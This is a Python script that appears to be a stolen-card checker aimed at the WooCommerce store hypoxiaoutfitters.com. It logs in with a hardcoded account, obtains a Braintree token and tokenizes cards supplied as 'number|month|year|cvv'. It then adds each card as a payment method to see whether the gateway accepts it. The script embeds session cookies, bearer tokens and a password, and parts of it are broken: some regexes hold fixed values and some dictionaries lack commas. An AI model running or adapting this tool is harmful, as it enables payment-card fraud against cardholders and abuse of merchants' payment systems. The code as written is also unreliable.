import requests,re,random,time,string,base64
from bs4 import BeautifulSoup

def Tele(cx):
    cc = cx.split("|")[0]
    bin=cc[:6]
    mes = cx.split("|")[1]
    ano = cx.split("|")[2]
    cvv = cx.split("|")[3]
    if "20" in ano:
        ano = ano.split("20")[1]
    r=requests.session()
    heaf={
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
}
    get=r.get("https://hypoxiaoutfitters.com/my-account/",headers=heaf)
    login=re.findall(r'name="woocommerce-login-nonce" value="(b33694b0ed)"',get.text)[0]
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check',
    'Origin': 'https://hypoxiaoutfitters.com',
    'Referer': 'https://hypoxiaoutfitters.com/my-account/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    'username': 'domorip664@telegmail.com',
    'password': 'Sixteenp@123',
    'woocommerce-login-nonce': '7fadc63032'
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

    response = r.post('https://hypoxiaoutfitters.com/my-account/', headers=headers, data=data)

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Referer': 'https://hypoxiaoutfitters.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    response = r.get('https://hypoxiaoutfitters.com/my-account/add-payment-method/',headers=headers)
#print(response.text)
    no=re.findall(r'"client_token_nonce":"(7fadc63032"',response.text)[0]
    cookies = {
    'wordpress_sec_7507f92267ba699b780a1d5b6a731630': 'domorip664%7C1726214675%7C6oahufk4Hgbtc0zITGH3mrsIJfoccFqjQRsSlgE4prf%7C00529cfbd58c5e132e1710ab6feab85a1790464351b46bae3aebfb305c3717c0',
    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '12',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    'nm-wishlist-ids': '[]',
    'wordpress_test_cookie': 'WP+Cookie+check',
    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
    'wordpress_logged_in_7507f92267ba699b780a1d5b6a731630':
 'domorip664%7C1726214675%7C6oahufk4Hgbtc0zITGH3mrsIJfoccFqjQRsSlgE4prf%7C00529cfbd58c5e132e1710ab6feab85a1790464351b46bae3aebfb305c3717c0',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'wordpress_sec_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6; _swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Origin': 'https://hypoxiaoutfitters.com',
    'Referer': 'https://hypoxiaoutfitters.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': '7fadc63032'
}

    response = r.post('https://hypoxiaoutfitters.com/xmlrpc.php', headers=headers, data=data)
    #print(response.text)
    token=re.findall(r'"data":"(.*?)"',response.text)[0]
    encoded_text = token
    decoded_text = base64.b64decode(encoded_text).decode('utf-8')
    au=re.findall(r'"authorizationFingerprint":"(eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYxMjgwOTksImp0aSI6Ijk0N2NhYTM5LWNiNzItNDY5NS04YzY2LTYyNGIzOTUwMmNiOSIsInN1YiI6IjI4MzRkYzd2NDY1M3NxcGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI4MzRkYzd2NDY1M3NxcGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.ZCD6ty7NYAbLMqeH6bnQPZZ-0rK_emddup_tucL7wV2JRib-68CgaCJbyRdWjNNc8ol_YhpZRXhY_ms04YycvA)"',decoded_text)[0]
    #print(au)
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYxMjgyODgsImp0aSI6IjI0ZGFmMGY5LTc2OWUtNDJiZC05MzdlLTMxMzkyNTY0YjUwMiIsInN1YiI6IjI4MzRkYzd2NDY1M3NxcGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI4MzRkYzd2NDY1M3NxcGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiSHlwb3hpYV9pbnN0YW50In19.WUye7ENDz8WgxJG1sgfDKgzGH-DDoJxJHQcV5WL0n3q3SI0oNS3NxaTnYZ1lziE3QEPjak2CXlreGpqpAnMjGQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '179d86fc-f0d5-480d-8d23-35b396b52b25',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token=response.json()['data']['tokenizeCreditCard']['token']
    gh={
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
}
    ges=r.get("https://hypoxiaoutfitters.com/my-account/add-payment-method/",headers=gh)
    pay=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(b33694b0ed)"',ges.text)[0]
    cookies = {
    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '12',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    'nm-wishlist-ids': '[]',
    'wordpress_test_cookie': 'WP+Cookie+check',
    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
    'wordpress_logged_in_7507f92267ba699b780a1d5b6a731630':
 'domorip664%7C1726214675%7C6oahufk4Hgbtc0zITGH3mrsIJfoccFqjQRsSlgE4prf%7C00529cfbd58c5e132e1710ab6feab85a1790464351b46bae3aebfb305c3717c0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Origin': 'https://hypoxiaoutfitters.com',
    'Referer': 'https://hypoxiaoutfitters.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': '7fadc63032'
    'wc_braintree_device_data': '{"correlation_id":"c72d268c09955baef9bfb3b5140f5664"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': '7fadc63032'
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

    time.sleep(25)
    response = r.post('https://hypoxiaoutfitters.com/my-account/add-payment-method/', headers=headers, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:  
      msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
    except:
      return "Status code avs: Gateway Rejected: avs"
    try:
    	if "Status code avs: Gateway Rejected: avs" in msg:
    		return msg
    except:
    	return "Status code avs:"
    else:
    	return msg